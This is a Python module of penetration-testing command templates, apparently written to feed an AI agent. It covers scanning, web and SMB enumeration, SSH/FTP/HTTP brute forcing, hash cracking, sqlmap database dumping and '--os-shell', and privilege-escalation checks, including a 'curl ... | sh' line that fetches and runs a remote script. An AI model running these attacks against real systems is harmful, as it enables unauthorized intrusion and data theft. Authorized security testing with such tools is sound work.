"""
Pentesting Command Reference

Quick command templates for common tasks.
The agent can use these as starting points.
"""


# Reconnaissance
RECON_COMMANDS = {
    "ping_sweep": {
        "command": "nmap -sn {target} -oG - | grep 'Up' | cut -d' ' -f2",
        "description": "Quick ping sweep to find live hosts",
        "example": "nmap -sn 10.0.0.0/24 -oG - | grep 'Up' | cut -d' ' -f2",
    },
    "port_scan_quick": {
        "command": "nmap -T4 -F {target}",
        "description": "Quick scan of top 100 ports",
        "example": "nmap -T4 -F 10.0.0.1",
    },
    "port_scan_full": {
        "command": "nmap -p- -T4 {target} -oA {loot_dir}/nmap_full_{target}",
        "description": "Full port scan (all 65535 ports)",
        "example": "nmap -p- -T4 10.0.0.1 -oA loot/nmap_full_10.0.0.1",
    },
    "port_scan_service": {
        "command": "nmap -sV -sC -p {ports} {target} -oA {loot_dir}/nmap_svc_{target}",
        "description": "Service and version detection with default scripts",
        "example": "nmap -sV -sC -p 22,80,443 10.0.0.1",
    },
    "port_scan_vuln": {
        "command": "nmap --script=vuln -p {ports} {target}",
        "description": "Run vulnerability scripts against ports",
        "example": "nmap --script=vuln -p 80,443 10.0.0.1",
    },
    "masscan_full": {
        "command": "masscan -p1-65535 {target} --rate=1000 -oL {loot_dir}/masscan_{target}.list",
        "description": "Very fast full port scan",
        "example": "masscan -p1-65535 10.0.0.1 --rate=1000",
    },
}


# Web Enumeration
WEB_COMMANDS = {
    "whatweb": {
        "command": "whatweb {url}",
        "description": "Identify web technologies",
        "example": "whatweb http://10.0.0.1",
    },
    "gobuster_dirs": {
        "command": "gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt -o {loot_dir}/gobuster.txt",
        "description": "Directory brute force",
        "example": "gobuster dir -u http://10.0.0.1 -w /usr/share/wordlists/dirb/common.txt",
    },
    "gobuster_vhosts": {
        "command": "gobuster vhost -u {url} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
        "description": "Virtual host enumeration",
        "example": "gobuster vhost -u http://target.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
    },
    "nikto": {
        "command": "nikto -h {url} -o {loot_dir}/nikto.txt",
        "description": "Web server scanner",
        "example": "nikto -h http://10.0.0.1",
    },
    "wpscan": {
        "command": "wpscan --url {url} --enumerate u,vp,vt",
        "description": "WordPress vulnerability scanner",
        "example": "wpscan --url http://10.0.0.1/wordpress --enumerate u,vp,vt",
    },
    "nuclei": {
        "command": "nuclei -u {url} -o {loot_dir}/nuclei.txt",
        "description": "Fast vulnerability scanner with templates",
        "example": "nuclei -u http://10.0.0.1",
    },
}


# SMB Enumeration
SMB_COMMANDS = {
    "smbclient_list": {
        "command": "smbclient -L //{target}/ -N",
        "description": "List SMB shares (null session)",
        "example": "smbclient -L //10.0.0.1/ -N",
    },
    "smbclient_connect": {
        "command": "smbclient //{target}/{share} -N",
        "description": "Connect to SMB share (null session)",
        "example": "smbclient //10.0.0.1/public -N",
    },
    "smbmap": {
        "command": "smbmap -H {target}",
        "description": "Enumerate SMB shares and permissions",
        "example": "smbmap -H 10.0.0.1",
    },
    "enum4linux": {
        "command": "enum4linux -a {target} | tee {loot_dir}/enum4linux.txt",
        "description": "Full SMB/NetBIOS enumeration",
        "example": "enum4linux -a 10.0.0.1",
    },
    "crackmapexec_smb": {
        "command": "crackmapexec smb {target} --shares",
        "description": "Enumerate SMB shares with CME",
        "example": "crackmapexec smb 10.0.0.1 --shares",
    },
}


# Password Attacks
PASSWORD_COMMANDS = {
    "hydra_ssh": {
        "command": "hydra -L {users} -P {passwords} ssh://{target}",
        "description": "SSH brute force",
        "example": "hydra -L users.txt -P passwords.txt ssh://10.0.0.1",
    },
    "hydra_ftp": {
        "command": "hydra -L {users} -P {passwords} ftp://{target}",
        "description": "FTP brute force",
        "example": "hydra -L users.txt -P passwords.txt ftp://10.0.0.1",
    },
    "hydra_http_post": {
        "command": "hydra -L {users} -P {passwords} {target} http-post-form '{path}:{params}:{fail_string}'",
        "description": "HTTP POST form brute force",
        "example": "hydra -L users.txt -P passwords.txt 10.0.0.1 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'",
    },
    "crackmapexec_smb_brute": {
        "command": "crackmapexec smb {target} -u {users} -p {passwords}",
        "description": "SMB password spraying",
        "example": "crackmapexec smb 10.0.0.1 -u users.txt -p passwords.txt",
    },
    "john_crack": {
        "command": "john --wordlist=/usr/share/wordlists/rockyou.txt {hash_file}",
        "description": "Crack password hashes with John",
        "example": "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
    },
    "hashcat_md5": {
        "command": "hashcat -m 0 {hash_file} /usr/share/wordlists/rockyou.txt",
        "description": "Crack MD5 hashes with hashcat",
        "example": "hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt",
    },
}


# SQL Injection
SQLI_COMMANDS = {
    "sqlmap_basic": {
        "command": "sqlmap -u '{url}' --batch --banner",
        "description": "Test URL parameter for SQLi",
        "example": "sqlmap -u 'http://10.0.0.1/page.php?id=1' --batch --banner",
    },
    "sqlmap_dbs": {
        "command": "sqlmap -u '{url}' --batch --dbs",
        "description": "List databases via SQLi",
        "example": "sqlmap -u 'http://10.0.0.1/page.php?id=1' --batch --dbs",
    },
    "sqlmap_tables": {
        "command": "sqlmap -u '{url}' --batch -D {database} --tables",
        "description": "List tables in database",
        "example": "sqlmap -u 'http://10.0.0.1/page.php?id=1' --batch -D mydb --tables",
    },
    "sqlmap_dump": {
        "command": "sqlmap -u '{url}' --batch -D {database} -T {table} --dump",
        "description": "Dump table contents",
        "example": "sqlmap -u 'http://10.0.0.1/page.php?id=1' --batch -D mydb -T users --dump",
    },
    "sqlmap_shell": {
        "command": "sqlmap -u '{url}' --batch --os-shell",
        "description": "Get OS shell via SQLi",
        "example": "sqlmap -u 'http://10.0.0.1/page.php?id=1' --batch --os-shell",
    },
}


# Privilege Escalation
PRIVESC_COMMANDS = {
    "find_suid": {
        "command": "find / -perm -4000 -type f 2>/dev/null",
        "description": "Find SUID binaries",
        "example": "find / -perm -4000 -type f 2>/dev/null",
    },
    "find_sgid": {
        "command": "find / -perm -2000 -type f 2>/dev/null",
        "description": "Find SGID binaries",
        "example": "find / -perm -2000 -type f 2>/dev/null",
    },
    "find_writable": {
        "command": "find / -writable -type d 2>/dev/null",
        "description": "Find world-writable directories",
        "example": "find / -writable -type d 2>/dev/null",
    },
    "sudo_l": {
        "command": "sudo -l",
        "description": "List sudo privileges",
        "example": "sudo -l",
    },
    "capabilities": {
        "command": "getcap -r / 2>/dev/null",
        "description": "Find binaries with capabilities",
        "example": "getcap -r / 2>/dev/null",
    },
    "linpeas": {
        "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
        "description": "Run LinPEAS enumeration script",
        "example": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
    },
    "pspy": {
        "command": "./pspy64",
        "description": "Monitor processes without root",
        "example": "./pspy64",
    },
}


# All command categories
ALL_COMMANDS = {
    "recon": RECON_COMMANDS,
    "web": WEB_COMMANDS,
    "smb": SMB_COMMANDS,
    "password": PASSWORD_COMMANDS,
    "sqli": SQLI_COMMANDS,
    "privesc": PRIVESC_COMMANDS,
}


def get_command(category: str, name: str, **kwargs: object) -> str | None:
    """Get a command template with substitutions."""
    if category not in ALL_COMMANDS:
        return None

    if name not in ALL_COMMANDS[category]:
        return None
    
    cmd = ALL_COMMANDS[category][name]["command"]

    # Provide a default loot_dir if not supplied.
    if "{loot_dir}" in cmd and "loot_dir" not in kwargs:
        try:
            from sploitgpt.core.config import get_settings
            kwargs["loot_dir"] = get_settings().loot_dir
        except Exception:
            kwargs["loot_dir"] = "loot"
    
    # Substitute variables
    for key, value in kwargs.items():
        cmd = cmd.replace(f"{{{key}}}", str(value))
    
    return cmd


def search_commands(query: str) -> list[dict[str, str]]:
    """Search for commands by keyword."""
    results: list[dict[str, str]] = []
    query_lower = query.lower()
    
    for category, commands in ALL_COMMANDS.items():
        for name, info in commands.items():
            if (query_lower in name.lower() or 
                query_lower in info["description"].lower() or
                query_lower in info["command"].lower()):
                results.append({
                    "category": category,
                    "name": name,
                    **info
                })
    
    return results


def format_commands_for_agent(category: str) -> str:
    """Format commands in a category for the agent."""
    if category not in ALL_COMMANDS:
        return f"Unknown category: {category}"
    
    commands = ALL_COMMANDS[category]
    lines = [f"**{category.upper()} Commands:**\n"]
    
    for name, info in commands.items():
        lines.append(f"**{name}**: {info['description']}")
        lines.append("```bash")
        lines.append(info['example'])
        lines.append("```")
        lines.append("")
    
    return "\n".join(lines)


def get_all_commands_formatted() -> str:
    """Get a compact reference of all commands for the LLM."""
    lines = ["## Quick Command Reference\n"]
    
    # Group by task type
    task_groups = {
        "Scanning": [
            ("nmap -sV -sC {target}", "Service/version scan with scripts"),
            ("nmap -p- -T4 {target}", "Full port scan"),
            ("nmap --script=vuln {target}", "Vulnerability scan"),
            ("masscan -p1-65535 {target} --rate=1000", "Fast full port scan"),
        ],
        "Web Enumeration": [
            ("gobuster dir -u {url} -w /usr/share/wordlists/dirb/common.txt", "Directory brute force"),
            ("nikto -h {url}", "Web vulnerability scan"),
            ("whatweb {url}", "Identify web technologies"),
            ("wpscan --url {url} -e u,vp,vt", "WordPress scan"),
            ("sqlmap -u '{url}?id=1' --batch", "SQL injection test"),
        ],
        "SMB/Windows": [
            ("smbclient -L //{target}/ -N", "List SMB shares (null session)"),
            ("smbmap -H {target}", "SMB share permissions"),
            ("enum4linux -a {target}", "Full SMB enumeration"),
            ("crackmapexec smb {target} --shares", "CME share enum"),
        ],
        "Password Attacks": [
            ("hydra -L users.txt -P pass.txt ssh://{target}", "SSH brute force"),
            ("hydra -L users.txt -P pass.txt ftp://{target}", "FTP brute force"),
            ("john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt", "Crack hashes"),
        ],
        "Privilege Escalation": [
            ("find / -perm -4000 2>/dev/null", "Find SUID binaries"),
            ("sudo -l", "Check sudo permissions"),
            ("cat /etc/crontab", "Check cron jobs"),
            ("getcap -r / 2>/dev/null", "Find capabilities"),
        ],
    }
    
    for group, commands in task_groups.items():
        lines.append(f"### {group}")
        for cmd, desc in commands:
            lines.append(f"- `{cmd}` - {desc}")
        lines.append("")
    
    return "\n".join(lines)
